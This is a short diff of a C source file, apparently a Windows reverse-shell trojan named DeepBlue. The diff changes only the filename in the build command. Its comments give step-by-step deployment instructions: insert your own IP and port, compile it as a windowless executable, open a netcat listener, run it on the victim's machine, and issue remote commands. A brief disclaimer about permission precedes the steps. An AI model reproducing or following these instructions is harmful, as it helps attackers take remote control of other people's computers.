@@ -17,7 +17,7 @@
 //please dont use it for illegal activities. and if u want to test it always get permission first! thanks you ;]
 
 //1. You should change the <YOUR_IP_ADDRESS> and <YOUR_PORT> to your own IP address and port where you want to receive the reverse shell connection.
-//2. Compile the code using a C compiller that supports this code. ( gcc malicios.c -o DeepBlue.exe -mwindows -lws2_32 -lshell32 -lole32 -luuid )
+//2. Compile the code using a C compiller that supports this code. ( gcc DeepBlue.c -o DeepBlue.exe -mwindows -lws2_32 -lshell32 -lole32 -luuid )
 //3. Run NC listener on your port ( nc -nvlp <YOUR_PORT> ) make sure this port isnt used by any other application. i would reccomend using a high port number like 50003.
 //4. Execute the compiled malware on the target machine. You should see a connection established on your NC listener, congratulations you madea connections, now you can execute commands remotely!
 // You can type "q" to quit the connection, this is also gonna stop the app on victims machine.
@@ -102,3 +102,4 @@ int APIENTRY WinMain(HINSTANCE hInstance,
     Shell();
     return 0;
 }
+
